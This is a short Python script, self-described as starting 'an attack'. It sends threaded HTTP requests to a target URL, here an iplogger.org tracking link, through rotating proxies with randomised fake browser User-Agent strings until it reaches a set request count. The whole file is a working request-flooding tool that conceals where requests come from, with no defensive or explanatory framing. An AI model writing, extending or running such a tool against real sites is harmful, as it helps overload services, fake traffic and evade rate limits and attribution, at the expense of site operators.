import threading, time
from proxy_requests import ProxyRequests
from fake_useragent import UserAgent
class Main:
	def __init__(self, target='https://google.com', threadcount=20):
		"""Main initialization
		"""
		#keep track of the initial settings for this object
		self.threadcount = threadcount
		self.target = target
		
		self.started = 0
		self.target_requests = 100
		self.UA = UserAgent()
		# a list of active threads, or None types. 
		self.threadslots = []
		# fill the slots up with blank space
		for i in range(self.threadcount): self.threadslots.append(None)
	
	def run(self):
		"""initiates an attack
		"""
		while self.started < self.target_requests:
			for i, v in enumerate(self.threadslots):
				if self.started >= self.target_requests: break
				if v == None: #there is no active thread running here
					#make request
					thread = threading.Thread(target = self.make_request, args=(i, )) #i being the slot index
					self.threadslots[i] = thread
					thread.start()
					self.started += 1
			time.sleep(1)
		
		while self.threadslots.count(None) < len(self.threadslots):
			time.sleep(.5)
		
	def make_request(self, slot_index):
		"""makes a request to the url
		"""
		proxy = ProxyRequests(self.target) #create a proxy targeting the target URL
		useragent = self.UA.random
		headers = {
			"User-Agent": useragent
		}
		proxy.set_headers(headers)
		failed = False
		try:
			proxy.get_with_headers() #send the request
		except:
			failed = True
		
		
		if failed == False: 
			self.threadslots[slot_index] = None #empty the slot, so that self.run knows to fill it up again
			print("COMPLETE!", slot_index) #just for testing purposes
		else:
			print("FAILED! Trying again.", slot_index)
			time.sleep(1)
			self.make_request(slot_index)

if __name__ == "__main__":
	m = Main(target = "https://iplogger.org/2jpyF6")
	m.run()
	print(m.started)